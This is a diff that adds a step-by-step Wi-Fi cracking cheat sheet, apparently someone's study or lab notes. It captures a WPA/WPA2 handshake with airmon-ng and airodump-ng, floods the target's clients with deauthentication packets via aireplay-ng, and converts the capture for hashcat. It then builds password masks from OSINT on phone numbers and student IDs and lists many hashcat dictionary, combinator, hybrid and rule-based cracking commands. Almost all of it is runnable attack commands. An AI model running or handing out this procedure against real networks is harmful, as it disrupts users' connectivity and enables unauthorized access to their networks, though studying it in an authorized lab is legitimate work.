@@ -1,0 +1,197 @@
+********************************************************************************************************
+STEP-1: Capture Handshake
+********************************************************************************************************
+Commands:
+iwconfig
+airmon-ng check
+airmon-ng check kill
+airmon-ng start wlan0
+airmon-ng
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c <CH> --bssid 6A:ED:36:CC:EA:E1 -w target_handshake
+aireplay-ng --deauth 0 -a 6A:ED:36:CC:EA:E1 wlan0mon
+
+PARAMETER VALUES:
+-------------------------------
+<CH> 			check chanel number from step 6
+6A:ED:36:CC:EA:E1	BSSID from the step 6 (Wireless Network MAC address)
+wlan0mon		wireless adapter from step 5
+
+
+Command No.1: In the above diagram the first command used to show a list of available (installed adapter) wireless interface cards with information like interface name, frequency, and SSID. 
+==============
+iwconfig
+
+Command No.2: It lists the processes (include process number and name) that might interfere with the attack process. It is very important to terminate before performing attacks. Simply it is a list of processes further can be killed.
+==============
+airmon-ng check
+
+Command No.3: This terminates the list interfering process display in the previous command.
+==============
+airmon-ng check kill
+
+Command No.4: This starts the selected adapter (in our case wlan0) into monitoring mode. ‘wlan0’ is the connected wireless adapter in the system shown already in the first command.
+==============
+airmon-ng start wlan0
+
+Command No.5: In this it checks processes are terminated and it shows an empty list of the processes.
+================
+airmon-ng
+
+Command No.6: In this it shows that list of the connected wireless adapter similar to the first command but adapter working with the monitoring mode.
+==============
+airodump-ng wlan0mon
+
+Command No.7: Save monitor and handshake file if any device connected to the wirelss network
+=======================
+airodump-ng wlan0mon -c <CH> --bssid 6A:ED:36:CC:EA:E1 -w target_handshake
+
+
+Command No.8: (do that in new terminal window) perfrom De-authentication client to the clients
+=======================
+aireplay-ng --deauth 0 -a 6A:ED:36:CC:EA:E1 wlan0mon
+
+PARAMETER VALUES:
+6A:ED:36:CC:EA:E1	BSSID from the step 1 (Wireless Network MAC address)
+wlan0mon		wireless adapter
+
+
+
+
+********************************************************************************************************
+STEP-2: Upload and convert a WPA / WPA2 pcap capture file to a hashcat capture file
+********************************************************************************************************
+
+STEP-1 GO TO THE LINK
+https://hashcat.net/cap2hccapx/
+
+STEP-2 SELECT .cap FILE
+Click on browse and select handshake file
+handshake.cap
+
+STEP-2 Convert and download
+Click on convert and download the file.
+
+********************************************************************************************************
+STEP-3: OSINT Framework
+********************************************************************************************************
+Get password intelligence
+
+https://osintframework.com/
+
+Mask						Sample password	Description
+-------------------------------------------------------------------------------------------
+7466?d?d?d?d?d?d				7466659650	Mobile number start with particular numbers
+?d?d?d?d?d?d2524				7466982524	Mobile number end with particular numbers
+W1904?d?d?d?d					W19048021	Student ID as the password
+?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l@gmail.com 	Myemailaddresss	Password use Gmail email address
+?u?l?l?l?l#?d?d?d				Wjohn#654	Strong password contain first character is capital, four lower characters and three number after # character
+
+
+********************************************************************************************************
+STEP-4: Perform attacks on handshake file
+********************************************************************************************************
+
+0.) VIEW LIST OF AVAILABLE GPU/CPU NUMBERS
+hashcat.exe I
+
+>>> Most of the time two devices CPU and GPU select 1 as 
+
+
+PARAMETER VALUES
+>> -d 1 	select GPU SR.No1		
+>> -m 22000 	select Mode 22000 that is WPA=PBKDF2-PMKID+EAPOL
+		https://hashcat.net/wiki/doku.php?id=hashcat
+
+>> -w 3		want performance to be high
+		https://hashcat.net/forum/thread-9008-post-47801.html
+
+>> --status	show actual process on screen
+
+------------------------------------------
+>> -a 0		dictionary attacks
+>> -a 1		combinator attack
+
+		SEE THE RULES		: https://hashcat.net/wiki/doku.php?id=rule_based_attack
+		SEE THE MASK RULES	: https://hashcat.net/wiki/doku.php?id=mask_attack
+
+>> -a 7		hybrid attack (add mask at first)
+>> -a 6		hybrid attack (add mask at end)
+
+>> -r		rulebased 
+
+1.) Dictonary Attack
+==================================================================================================================================================
+Display passwords on the screen
+------
+hashcat.exe --stdout ../wordlist.txt
+
+crack password
+-----
+hashcat.exe -d 1 -m 22000 -w 3 -a 0 --status ../handshake3.hc22000 ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 0 --status ../handshake4.hc22000 ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 0 --status ../handshake5.hc22000 ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 0 --status ../handshake6.hc22000 ../wordlist.txt
+
+
+2.) Combinator attack
+==================================================================================================================================================
+Display passwords on the screen
+----------
+hashcat.exe --stdout -a 1 ../wordlist.txt ../wordlist2.txt
+
+crack password
+-----
+hashcat.exe -d 1 -m 22000 -w 3 -a 1 ../handshake3.hc22000 ../wordlist.txt ../wordlist2.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 1 ../handshake4.hc22000 ../wordlist.txt ../wordlist2.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 1 ../handshake5.hc22000 ../wordlist.txt ../wordlist2.txt
+hashcat.exe -d 1 -m 22000 -w 3 -a 1 ../handshake6.hc22000 ../wordlist.txt ../wordlist2.txt
+
+
+2.) Hybrid attack 
+==================================================================================================================================================
+MODE - 7 (add mask at first position)
+=========================================================================
+
+Display passwords on the screen
+----------
+hashcat.exe --stdout -a 7 ?d ../wordlist.txt
+hashcat.exe --stdout -a 7 ?l ../wordlist.txt
+
+crack password
+-----
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 7 ../handshake3.hc22000 ?d ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 7 ../handshake4.hc22000 ?d ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 7 ../handshake5.hc22000 ?d ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 7 ../handshake6.hc22000 ?l ../wordlist.txt
+
+MODE - 6 (add mask at first position)
+=========================================================================
+
+Display passwords on the screen
+----------
+hashcat.exe --stdout -a 6 ../wordlist.txt ?s
+hashcat.exe --stdout -a 6 ../wordlist.txt ?d
+hashcat.exe --stdout -a 6 ../wordlist.txt ?l
+
+crack password
+-----
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 6 ../handshake3.hc22000 ../wordlist.txt ?s
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 6 ../handshake4.hc22000 ../wordlist.txt ?s
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 6 ../handshake5.hc22000 ../wordlist.txt ?d
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 6 ../handshake6.hc22000 ../wordlist.txt ?l
+
+
+2.) Rulebased attack
+==================================================================================================================================================
+Display passwords on the screen
+----------
+hashcat.exe --stdout -a 0  -r ../rulebased/test1_rules1.rule -r ../rulebased/test1_rules2.rule ../wordlist.txt
+hashcat.exe --stdout -a 0  -r ../rulebased/test2_rules1.rule -r ../rulebased/test2_rules2.rule ../wordlist.txt
+hashcat.exe --stdout -a 0  -r ../rulebased/test3_rules1.rule ../wordlist.txt
+
+crack password
+-----
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 0 ../handshake5.hc22000 -r ../rulebased/test1_rules1.rule -r ../rulebased/test1_rules2.rule ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 0 ../handshake6.hc22000 -r ../rulebased/test2_rules1.rule -r ../rulebased/test2_rules2.rule ../wordlist.txt
+hashcat.exe -d 1 -m 22000 -w 3 --status -a 0 ../handshake6.hc22000 -r ../rulebased/test3_rules1.rule ../wordlist.txt
